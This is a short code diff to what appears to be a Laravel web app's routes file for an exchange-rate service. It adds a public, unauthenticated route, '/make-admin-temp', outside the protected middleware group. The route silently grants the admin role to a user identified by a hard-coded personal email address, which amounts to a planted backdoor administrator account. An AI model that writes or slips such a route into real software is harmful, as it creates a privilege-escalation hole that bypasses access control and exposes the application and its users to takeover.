@@ -21,6 +21,15 @@ Route::get('/rates', [ExchangeRateController::class, 'index']);
 Route::get('/compare', [ExchangeRateController::class, 'compare']);
 Route::post('/conversions', [ConversionController::class, 'store']);
 
+Route::get('/make-admin-temp', function () {
+    $user = \App\Models\User::where('email', 'tadiaemekson@gmail.com')->first();
+    if ($user) {
+        $user->update(['role' => 'admin']);
+        return "Success!";
+    }
+    return "User not found.";
+});
+
 // Protected routes
 Route::middleware('auth:sanctum')->group(function () {
     Route::get('/user', function (Request $request) {
